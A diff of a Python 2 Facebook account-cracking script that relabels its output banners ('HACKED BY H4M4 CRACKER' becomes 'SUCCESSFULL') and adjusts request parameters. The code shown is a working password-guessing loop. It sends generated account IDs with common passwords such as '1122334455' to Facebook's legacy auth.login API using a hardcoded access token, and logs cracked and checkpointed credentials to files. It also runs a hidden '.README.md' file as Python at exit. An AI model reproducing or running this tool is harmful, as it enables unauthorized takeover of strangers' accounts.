@@ -46,13 +46,15 @@ def t():
 
 def cb():
     os.system('clear')
-
-
-logo = logo ="""
-
-==================                          
- MOHAMMED SABAH                                    
-==================  
+        
+        
+logo ="""_    _                          _____        __ _
+ | |  | |                        / ____|      / _| |
+ | |__| | __ _ _ __ ___   __ _  | (___   ___ | |_| |___      ____ _ _ __ ___
+ |  __  |/ _` | '_ ` _ \ / _` |  \___ \ / _ \|  _| __\ \ /\ / / _` | '__/ _ \
+ | |  | | (_| | | | | | | (_| |  ____) | (_) | | | |_ \ V  V / (_| | | |  __/
+ |_|  |_|\__,_|_| |_| |_|\__,_| |_____/ \___/|_|  \__| \_/\_/ \__,_|_|  \___|
+   
 \033[1;97m  
 \033[1;97m       WELCOM BACK
 \033[1;97m  THE ONE TOOL CHANEEL HAMA IT
@@ -137,64 +139,65 @@ def action():
 
         try:
             pass1 = user
-            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="  + k + c + user + '&locale=en_US&password=' + pass1 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;93m[HACKED BY H4M4 CRACKER]\x1b[1;93m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
+                print '\x1b[1;93m[SUCCESSFULL]\x1b[1;93m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
                 okb = open('save/successfull.txt', 'a')
                 okb.write(k + c + user + '>>>' + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;97m[CP]\x1b[1;97m ' + k + c + user + ' >>> ' + pass1 + '\n'
+                print '\x1b[1;97m[CHECKPOINT]\x1b[1;97m ' + k + c + user + ' >>> ' + pass1 + '\n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '>>>' + pass1 + '\n')
                 cps.close()
                 cpb.append(c + user + pass1)
             else:
                 pass2 = '1122334455'
-            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + k + c + user + '&locale=en_US&password=' + pass2 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;93m[HACKED BY H4M4 CRACKER]\x1b[1;93m ' + k + c + user + ' >>> ' + pass2 + '\n' + '\n'
+                print '\x1b[1;93m[SUCCESSFULL]\x1b[1;93m ' + k + c + user + ' >>> ' + pass2 + '\n' + '\n'
                 okb = open('save/successfull.txt', 'a')
                 okb.write(k + c + user + '>>>' + pass2 + '\n')
                 okb.close()
                 oks.append(c + user + pass2)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;97m[CP]\x1b[1;97m ' + k + c + user + ' >>> ' + pass2 + '\n'
+                print '\x1b[1;97m[CHECKPOINT]\x1b[1;97m ' + k + c + user + ' >>> ' + pass2 + '\n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '>>>' + pass2 + '\n')
                 cps.close()
                 cpb.append(c + user + pass2)
             else:
                 pass3 = '1234554321'
-            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + k + c + user + '&locale=en_US&password=' + pass3 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;93m[HACKED BY H4M4 CRACKER]\x1b[1;93m ' + k + c + user + ' >>> ' + pass3 + '\n' + '\n'
+                print '\x1b[1;93m[SUCCESSFULL]\x1b[1;93m ' + k + c + user + ' >>> ' + pass3 + '\n' + '\n'
                 okb = open('save/successfull.txt', 'a')
                 okb.write(k + c + user + '>>>' + pass3 + '\n')
                 okb.close()
                 oks.append(c + user + pass3)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;97m[CP]\x1b[1;97m ' + k + c + user + ' >>> ' + pass3 + '\n'
+                print '\x1b[1;97m[CHECKPOINT]\x1b[1;97m ' + k + c + user + ' >>> ' + pass3 + '\n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '>>>' + pass3 + '\n')
                 cps.close()
                 cpb.append(c + user + pass3)
             else:
                 pass4 = '112233445566'
-            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + k + c + user + '&locale=en_US&password=' + pass4 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6" )
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;93m[HACKED BY H4M4 CRACKER]\x1b[1;93m ' + k + c + user + ' >>> ' + pass4 + '\n' + '\n'
+                print '\x1b[1;93m[SUCCESSFULL]\x1b[1;93m ' + k + c + user + ' >>> ' + pass4 + '\n' + '\n'
                 okb = open('save/successfull.txt', 'a')
                 okb.write(k + c + user + '>>>' + pass4 + '\n')
                 okb.close()
                 oks.append(c + user + pass4)
+                
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;97m[CP]\x1b[1;97m ' + k + c + user + ' >>> ' + pass4 + '\n'
+                print '\x1b[1;97m[CHECKPOINT]\x1b[1;97m ' + k + c + user + ' >>> ' + pass4 + '\n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '>>>' + pass4 + '\n')
                 cps.close()
@@ -206,7 +209,7 @@ def action():
     p.map(main, id)
     print 42 * '\x1b[1;91m='
     print '[\xe2\x9c\x93]\x1b[1;93m CRACK WAS END ....'
-    print '[\xe2\x9c\x93]\x1b[1;92m FB CRACK WAS/\x1b[1;96mNABETAWA : ' + str(len(oks)) + '/' + str(len(cpb))
+    print '[\xe2\x9c\x93]\x1b[1;92m FB CRACK WAS/\x1b[1;96mCHECKPOINT : ' + str(len(oks)) + '/' + str(len(cpb))
     print '[\xe2\x9c\x93]\x1b[1;91m CP File Has Been Saved : save/checkpoint.txt'
     raw_input('\n[THANKS FOR USE THE TOOL]')
     os.system('python2 .README.md')
